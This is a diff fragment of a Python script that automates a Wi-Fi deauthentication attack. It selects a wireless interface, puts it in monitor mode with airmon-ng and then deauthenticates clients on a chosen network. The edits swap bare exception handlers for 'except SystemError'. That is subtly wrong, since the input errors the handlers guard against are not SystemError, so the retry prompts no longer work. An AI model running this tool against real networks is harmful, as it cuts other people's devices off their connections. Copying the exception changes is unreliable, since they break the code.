@@ -64,7 +64,7 @@ for file_name in os.listdir():
         try:
             # We make a new directory called /backup
             os.mkdir(directory + "/backup/")
-        except:
+        except SystemError:
             print("Backup folder exists.")
         # Create a timestamp
         timestamp = datetime.now()
@@ -103,7 +103,7 @@ while True:
     try:
         if check_wifi_result[int(wifi_interface_choice)]:
             break
-    except:
+    except SystemError:
         print("Please enter a number that corresponds with the choices available.")
 
 # For easy reference we call the selected interface hacknic
@@ -217,7 +217,7 @@ while True:
     try:
         if active_wireless_networks[int(choice)]:
             break
-    except:
+    except SystemError:
         print("Please try again.")
 
 # To make it easier to work with and read the code, we assign the results to variables.
@@ -228,7 +228,7 @@ hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 # Monitoring takes place on a different channel and we need to set it to that channel.
 subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 
-# Deauthenticate clients using a subprocess.
+# De-authenticate clients using a subprocess.
 # The script is the parent process and creates a child process which runs the system command,
 # and will only continue once the child process has completed.
 subprocess.run(
